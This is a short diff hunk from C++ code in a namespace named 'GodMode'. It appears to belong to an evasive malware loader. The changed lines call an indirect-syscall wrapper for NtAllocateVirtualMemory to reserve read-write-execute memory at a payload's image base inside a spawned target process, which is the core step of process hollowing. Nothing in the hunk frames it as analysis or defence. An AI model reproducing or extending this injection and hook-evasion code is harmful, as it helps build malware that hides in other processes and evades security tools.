@@ -136,14 +136,14 @@ namespace GodMode
             // Allocate memory in target at preferred base via indirect syscall (NtAllocateVirtualMemory)
             PVOID remoteMem = (PVOID)ntHeaders->OptionalHeader.ImageBase;
             SIZE_T regionSize = ntHeaders->OptionalHeader.SizeOfImage;
-            NTSTATUS status = Syscall::NtAllocateVirtualMemory(pi.hProcess, &remoteMem, 0, &regionSize,
+            NTSTATUS status = Syscall::NtAllocateVirtualMemory(pi.hProcess, &remoteMem, &regionSize,
                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
             if (status != 0)
             {
                 // If preferred base fails, try any address
                 remoteMem = NULL;
-                status = Syscall::NtAllocateVirtualMemory(pi.hProcess, &remoteMem, 0, &regionSize,
+                status = Syscall::NtAllocateVirtualMemory(pi.hProcess, &remoteMem, &regionSize,
                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
             }
 
